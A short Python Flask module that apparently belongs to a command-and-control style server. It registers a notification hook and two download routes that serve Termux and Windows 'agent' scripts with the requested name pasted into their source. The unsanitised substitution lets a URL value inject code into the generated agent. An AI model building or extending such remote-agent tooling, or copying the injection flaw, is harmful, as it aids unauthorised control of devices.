from flask import request

class Hooks(object):
    def __init__(self, app, io, base="https://command.marcusweinberger.repl.co", uri="/hooks", *args, **kwargs):
        self.app = app
        self.io = io
        self.base = base
        self.uri = uri
        self._add_url_rules()
        self.response = "<script>window.close()</script>"
    
    def _url(self, path):
        return self.base + self.uri + path
    def _add_url_rules(self):
        self.app.add_url_rule(self.uri + "/notify", "hooks_notify", view_func=self.hook_notify)
        self.app.add_url_rule(self.uri + "/dla/<name>", "hooks_termux_agent_dl", view_func=self.hook_termux_agent)
        self.app.add_url_rule(self.uri + "/dlw/<name>", "hooks_windows_agent_dl", view_func=self.hook_windows_agent)
    
    def hook_notify(self):
        self.io.show(request.args['msg'])
        return self.response
    
    def hook_termux_agent(self, name):
        return open("agents/termux_agent.py","r").read().replace("$agentname",str(name))
    
    def hook_windows_agent(self, name):
        return open("agents/windows_agent.py", "r").read().replace("$agentname",str(name))